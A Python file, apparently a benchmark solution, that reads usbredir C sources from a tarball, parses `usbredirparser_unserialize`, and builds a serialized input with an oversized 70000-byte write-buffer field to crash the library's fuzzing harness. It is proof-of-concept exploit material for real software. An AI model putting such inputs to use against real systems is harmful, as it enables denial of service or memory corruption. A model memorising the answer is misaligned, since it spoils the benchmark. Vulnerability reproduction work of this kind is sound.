import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


def _read_tar_text_files(src_path: str, max_file_size: int = 1024 * 1024) -> Dict[str, str]:
    texts: Dict[str, str] = {}
    if not os.path.exists(src_path):
        return texts
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                name = m.name
                lower = name.lower()
                if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".h") or lower.endswith(".hpp")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if txt:
                    texts[name] = txt
    except Exception:
        return texts
    return texts


def _strip_c_comments_and_strings(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    state = "code"  # code, line_comment, block_comment, string, char
    while i < n:
        c = s[i]
        if state == "code":
            if c == "/" and i + 1 < n and s[i + 1] == "/":
                state = "line_comment"
                i += 2
                continue
            if c == "/" and i + 1 < n and s[i + 1] == "*":
                state = "block_comment"
                i += 2
                continue
            if c == '"':
                state = "string"
                out.append(" ")
                i += 1
                continue
            if c == "'":
                state = "char"
                out.append(" ")
                i += 1
                continue
            out.append(c)
            i += 1
            continue
        elif state == "line_comment":
            if c == "\n":
                state = "code"
                out.append("\n")
            i += 1
            continue
        elif state == "block_comment":
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                state = "code"
                i += 2
            else:
                i += 1
            continue
        elif state == "string":
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                state = "code"
                i += 1
            else:
                i += 1
            continue
        elif state == "char":
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                state = "code"
                i += 1
            else:
                i += 1
            continue
    return "".join(out)


def _extract_macro_int(texts: Dict[str, str], macro_suffix: str) -> Optional[int]:
    # Try to find "#define *<suffix>* <int>"
    pat = re.compile(r"^[ \t]*#define[ \t]+([A-Za-z0-9_]*" + re.escape(macro_suffix) + r"[A-Za-z0-9_]*)[ \t]+(.+)$", re.M)
    for _, txt in texts.items():
        m = pat.search(txt)
        if not m:
            continue
        val = m.group(2).strip()
        val = val.split("/*", 1)[0].strip()
        val = val.split("//", 1)[0].strip()
        if not val:
            continue
        # numeric literal
        mnum = re.match(r"^(0x[0-9a-fA-F]+|\d+)\b", val)
        if mnum:
            try:
                return int(mnum.group(1), 0)
            except Exception:
                pass
        # char literal like 'USBR' not handled robustly; ignore
    return None


def _detect_endianness(texts: Dict[str, str]) -> str:
    joined = "\n".join(texts.values())
    if re.search(r"\b(TO_LE|FROM_LE|htole|le32toh|le16toh|cpu_to_le|GUINT\d+_TO_LE|GUINT\d+_FROM_LE)\b", joined):
        return "little"
    if re.search(r"\b(TO_BE|FROM_BE|htobe|be32toh|be16toh|cpu_to_be|GUINT\d+_TO_BE|GUINT\d+_FROM_BE)\b", joined):
        return "big"
    return "little"


def _pack_int(v: int, bits: int, endianness: str) -> bytes:
    n = bits // 8
    v &= (1 << bits) - 1
    if endianness == "big":
        return v.to_bytes(n, "big", signed=False)
    return v.to_bytes(n, "little", signed=False)


def _split_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth = 0
    bracket = 0
    brace = 0
    i = 0
    n = len(arg_str)
    while i < n:
        c = arg_str[i]
        if c == "(":
            depth += 1
            cur.append(c)
        elif c == ")":
            depth = max(0, depth - 1)
            cur.append(c)
        elif c == "[":
            bracket += 1
            cur.append(c)
        elif c == "]":
            bracket = max(0, bracket - 1)
            cur.append(c)
        elif c == "{":
            brace += 1
            cur.append(c)
        elif c == "}":
            brace = max(0, brace - 1)
            cur.append(c)
        elif c == "," and depth == 0 and bracket == 0 and brace == 0:
            a = "".join(cur).strip()
            args.append(a)
            cur = []
        else:
            cur.append(c)
        i += 1
    tail = "".join(cur).strip()
    if tail:
        args.append(tail)
    return args


def _parse_ident_from_addr(expr: str) -> str:
    e = expr.strip()
    if e.startswith("&"):
        e = e[1:].strip()
    e = re.sub(r"^\(\s*[^)]+\s*\)\s*", "", e)  # strip casts
    e = re.sub(r"\s+", "", e)
    return e


@dataclass
class _Call:
    kind: str  # 'scalar' or 'data'
    bits: int  # for scalar
    fn: str
    args: List[str]
    out_var: str = ""
    len_expr: str = ""
    ptr_expr: str = ""


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    cleaned = _strip_c_comments_and_strings(text)
    idx = cleaned.find(func_name)
    if idx < 0:
        return None
    # Ensure it's a function definition, not a call
    # Find next '{' after the name and a '(' and ')'
    p = cleaned.find("(", idx)
    if p < 0:
        return None
    # Find matching ')'
    depth = 0
    i = p
    n = len(cleaned)
    while i < n:
        c = cleaned[i]
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                break
        i += 1
    if depth != 0:
        return None
    after_paren = i + 1
    brace_start = cleaned.find("{", after_paren)
    if brace_start < 0:
        return None
    # Ensure no ';' before '{' (would indicate prototype)
    semi = cleaned.find(";", after_paren, brace_start)
    if semi >= 0:
        # likely a prototype; search for next occurrence
        nxt = cleaned.find(func_name, brace_start)
        if nxt >= 0 and nxt != idx:
            return _extract_function_body(text, func_name)
        return None
    # Extract body with brace matching
    depth = 0
    i = brace_start
    while i < n:
        c = cleaned[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return cleaned[brace_start + 1 : i]
        i += 1
    return None


def _extract_unserialize_calls(body: str) -> List[_Call]:
    calls: List[_Call] = []
    # Find occurrences of unserialize_* and parse balanced call
    s = body
    n = len(s)
    i = 0
    while i < n:
        j = s.find("unserialize_", i)
        if j < 0:
            j = s.find("usbredirparser_unserialize_", i)
        if j < 0:
            break
        # Get identifier
        k = j
        while k > 0 and (s[k - 1].isalnum() or s[k - 1] == "_"):
            k -= 1
        # find end of identifier
        t = j
        while t < n and (s[t].isalnum() or s[t] == "_"):
            t += 1
        fn = s[k:t].strip()
        # ensure next non-space is '('
        u = t
        while u < n and s[u].isspace():
            u += 1
        if u >= n or s[u] != "(":
            i = t
            continue
        # parse parentheses
        depth = 0
        v = u
        while v < n:
            if s[v] == "(":
                depth += 1
            elif s[v] == ")":
                depth -= 1
                if depth == 0:
                    break
            v += 1
        if depth != 0:
            i = u + 1
            continue
        arg_str = s[u + 1 : v]
        # parse args
        args = _split_args(arg_str)
        # Determine kind
        kind = None
        bits = 0
        if fn.endswith("unserialize_data"):
            kind = "data"
        else:
            m = re.search(r"(?:u?int)?(8|16|32|64)\b", fn)
            if m:
                kind = "scalar"
                bits = int(m.group(1))
            else:
                # unknown, skip
                i = v + 1
                continue
        call = _Call(kind=kind, bits=bits, fn=fn, args=args)
        if kind == "scalar" and args:
            call.out_var = _parse_ident_from_addr(args[-1])
        elif kind == "data" and args:
            call.len_expr = args[-1].strip()
            if len(args) >= 2:
                call.ptr_expr = args[-2].strip()
        calls.append(call)
        i = v + 1
    return calls


def _looks_like_unserialize_harness(text: str) -> bool:
    if "LLVMFuzzerTestOneInput" not in text and "main(" not in text:
        return False
    if "usbredir" not in text.lower():
        return False
    if re.search(r"\bunserialize\b", text) or re.search(r"\busbredirparser_unserialize\b", text):
        if re.search(r"\bserialize\b", text) or re.search(r"\busbredirparser_serialize\b", text):
            return True
    return False


def _harness_uses_unserialize_directly(text: str) -> bool:
    # Check for calls like usbredirparser_unserialize(..., data, size) or similar
    if not (_looks_like_unserialize_harness(text) or "LLVMFuzzerTestOneInput" in text):
        return False
    if re.search(r"\busbredirparser_unserialize\s*\([^;]*\bdata\b[^;]*\bsize\b[^;]*\)", text):
        return True
    if re.search(r"\bunserialize\s*\([^;]*\bdata\b[^;]*\bsize\b[^;]*\)", text):
        return True
    if re.search(r"\bdeserialize\s*\([^;]*\bdata\b[^;]*\bsize\b[^;]*\)", text):
        return True
    return False


def _find_harness_text(texts: Dict[str, str]) -> Optional[str]:
    # Prefer fuzzer harness
    candidates = []
    for name, txt in texts.items():
        if "LLVMFuzzerTestOneInput" in txt and "usbredir" in txt.lower():
            candidates.append((0, name, txt))
        elif "LLVMFuzzerTestOneInput" in txt:
            candidates.append((1, name, txt))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (x[0], len(x[2])))
    return candidates[0][2]


def _find_unserialize_body(texts: Dict[str, str]) -> Optional[str]:
    # find function usbredirparser_unserialize
    for name, txt in texts.items():
        if "usbredirparser_unserialize" in txt:
            body = _extract_function_body(txt, "usbredirparser_unserialize")
            if body:
                return body
    # try generic "unserialize" as fallback
    for name, txt in texts.items():
        if re.search(r"\bunserialize\s*\(", txt) and "usbredir" in txt.lower():
            body = _extract_function_body(txt, "unserialize")
            if body:
                return body
    return None


def _generate_unserialize_poc(texts: Dict[str, str], payload_len: int) -> Optional[bytes]:
    endianness = _detect_endianness(texts)
    magic = _extract_macro_int(texts, "SERIALIZE_MAGIC")
    version = _extract_macro_int(texts, "SERIALIZE_VERSION")
    if magic is None:
        magic = 0
    if version is None:
        version = 1

    body = _find_unserialize_body(texts)
    if not body:
        return None

    calls = _extract_unserialize_calls(body)
    if not calls:
        return None

    # Identify the likely write-buffer data call and its length variable/expression
    target_data_call: Optional[_Call] = None
    for c in calls:
        if c.kind != "data":
            continue
        blob = (c.fn + " " + c.ptr_expr).lower()
        if "write" in blob or "wbuf" in blob or "writebuf" in blob or "write_buf" in blob or "writebuffer" in blob:
            target_data_call = c
            break
    if target_data_call is None:
        # fallback: use last data call with non-literal length
        for c in reversed(calls):
            if c.kind == "data":
                if not re.match(r"^\s*(0x[0-9a-fA-F]+|\d+)\s*$", c.len_expr or ""):
                    target_data_call = c
                    break
    if target_data_call is None:
        return None

    target_len_expr = (target_data_call.len_expr or "").strip()
    if not target_len_expr:
        return None

    # Choose a scalar that likely corresponds to write buffer count
    write_count_vars = []
    for c in calls:
        if c.kind != "scalar":
            continue
        if c.bits not in (32, 16, 8):
            continue
        v = (c.out_var or "").lower()
        if ("write" in v and "buf" in v) and ("count" in v or "num" in v or "nr" in v or "n" == v or v.endswith("n")):
            write_count_vars.append(c.out_var)
    write_count_var = write_count_vars[0] if write_count_vars else ""

    # Determine which scalar op sets the target len expression (best effort)
    # Normalize expressions by stripping spaces
    norm_target_len = re.sub(r"\s+", "", target_len_expr)
    # strip casts
    norm_target_len = re.sub(r"^\(\s*[^)]+\s*\)\s*", "", norm_target_len)
    # track variables used as lengths
    length_exprs = set()
    for c in calls:
        if c.kind == "data":
            le = (c.len_expr or "").strip()
            if not le:
                continue
            if not re.match(r"^\s*(0x[0-9a-fA-F]+|\d+)\s*$", le):
                length_exprs.add(re.sub(r"\s+", "", le))

    # Build mapping scalar out_var -> assigned value
    assigned: Dict[str, int] = {}

    # We default scalars to 1 to encourage loop bodies to execute once and keep alignment
    def scalar_value(out_var: str) -> int:
        lv = (out_var or "").lower()
        if "magic" in lv:
            return int(magic) & 0xFFFFFFFF
        if "version" in lv:
            return int(version) & 0xFFFFFFFF
        if write_count_var and out_var == write_count_var:
            return 1
        # if this scalar is the one used for target data length, set payload_len
        ovn = re.sub(r"\s+", "", out_var)
        if ovn == norm_target_len:
            return payload_len
        # If scalar appears to set any data length, set to 0 to avoid extra blocks
        if ovn in length_exprs:
            return 0
        # Otherwise keep it small non-zero
        return 1

    # Pass 1: assign scalars
    for c in calls:
        if c.kind != "scalar":
            continue
        assigned[c.out_var] = scalar_value(c.out_var)

    # If target len expression is not an exact scalar out_var name, try to find a matching scalar by suffix
    if norm_target_len not in assigned:
        for out_var in list(assigned.keys()):
            ovn = re.sub(r"\s+", "", out_var)
            if ovn and (ovn == norm_target_len or ovn.endswith(norm_target_len) or norm_target_len.endswith(ovn)):
                assigned[out_var] = payload_len

    # Generate bytes in the order of calls
    out = bytearray()
    payload = b"A" * payload_len

    for c in calls:
        if c.kind == "scalar":
            v = assigned.get(c.out_var, 1)
            out += _pack_int(v, c.bits, endianness)
        else:
            le = (c.len_expr or "").strip()
            if not le:
                continue
            m = re.match(r"^\s*(0x[0-9a-fA-F]+|\d+)\s*$", le)
            if m:
                ln = int(m.group(1), 0)
                if ln > 0:
                    out += b"\x00" * ln
                continue
            norm_le = re.sub(r"\s+", "", le)
            # If this is the target data, emit payload
            ptr_blob = (c.ptr_expr or "").lower()
            if (norm_le == norm_target_len) or (("write" in ptr_blob or "wbuf" in ptr_blob or "writebuf" in ptr_blob or "write_buf" in ptr_blob) and norm_le == norm_target_len):
                out += payload
                continue
            # Else, emit zeros for its length if we can resolve it
            ln = 0
            # direct match
            for k, v in assigned.items():
                if re.sub(r"\s+", "", k) == norm_le:
                    ln = int(v)
                    break
            # heuristic: if unresolved, assume 0 (we attempted to force lengths to 0)
            if ln > 0:
                out += b"\x00" * ln

    # Ensure minimum size
    if len(out) < 64:
        out += b"\x00" * (64 - len(out))
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = _read_tar_text_files(src_path)

        payload_len = 70000

        harness = _find_harness_text(texts)
        if harness and _harness_uses_unserialize_directly(harness):
            poc = _generate_unserialize_poc(texts, payload_len=payload_len)
            if poc is not None:
                return poc

        return b"\xFF" * payload_len